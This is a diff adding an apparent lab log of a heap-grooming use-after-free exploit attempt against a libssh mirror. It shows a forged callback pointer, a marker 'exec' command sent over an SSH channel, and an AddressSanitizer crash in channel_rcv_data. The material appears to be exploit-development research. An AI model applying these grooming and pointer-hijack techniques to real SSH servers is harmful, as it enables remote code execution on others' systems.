@@ -1,0 +1,40 @@
+[2026/11/26 02:05:09.351754, 1] ssh_strict_fopen:  Failed to open a file /etc/ssh/ssh_known_hosts for reading: No such file or directory
+SERVER auth len user=5 pass=9 success=0
+CLIENT auth rc=0
+SERVER registered callbacks on channel 43
+CLIENT channel local=43 remote=43
+SERVER data #1 len=12 first=f 
+CLIENT inline cbs_off=72 size=24 userdata=0x5558e6ae9340 fn=0x4141414141414141
+CLIENT wirelist cbs=0x50c00001c4c8 next=0x0
+CLIENT sent exec cmd=touch evidence-wire-vuln-groom-exec.marker fn=0x4141414141414141
+CLIENT sent groom wire pointer=0x5558e6b43180 survive=0
+CLIENT sent close+data marker=MISHE-LIBSSH-UAF-WIRE
+SERVER close callback
+SERVER data #2 len=128 first=t off16=i
+SERVER nodetach saved_buf=0x5030000236b0 saved_it=0x502000006f70
+[2026/11/26 02:05:10.537059, 1] ssh_socket_exception_callback:  Socket exception callback: 2 (32)
+SERVER groom alloc=0x50c00001c480 wire_off120=0x5558e6b43180 target=0x5558e6b43180 survive=0
+SERVER inline cbs=0x50c00001c4c8 off=72
+SERVER wirelist it=0x502000006f70 next=0x50c00001c4e0 data=0x50c00001c4c8
+SERVER nodetach reclaim it=0x502000006f70 want=0x502000006f70 buf=0x5030000236b0 want=0x5030000236b0
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==3614604==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x5558e6a3d161 bp 0x7ffd0d67a230 sp 0x7ffd0d67a160 T0)
+==3614604==The signal is caused by a READ memory access.
+==3614604==Hint: this fault was caused by a dereference of a high value address (see register values below).  Disassemble the provided pc to learn which register was used.
+    #0 0x5558e6a3d161 in channel_rcv_data /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/channels.c:697:16
+    #1 0x5558e6a6c2cb in ssh_packet_process /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1748:14
+    #2 0x5558e6a6abc3 in ssh_packet_socket_callback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1581:17
+    #3 0x5558e6a852e9 in ssh_socket_pollcallback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/socket.c:380:29
+    #4 0x5558e6a7dfb6 in ssh_poll_ctx_dopoll /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/poll.c:770:33
+    #5 0x5558e6a2a70d in run_server /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:381:9
+    #6 0x5558e6a2a335 in main /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:748:18
+    #7 0x72d583c2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #8 0x72d583c2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #9 0x5558e694ffb4 in _start (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire-wl-vuln+0x57fb4) (BuildId: 24e50a333a83014c1b280cfd24f6542a3d58e85d)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/channels.c:697:16 in channel_rcv_data
+==3614604==ABORTING
+SERVER death target=0x41414141414141c1
+CLIENT rc=0 SERVER status=0x100
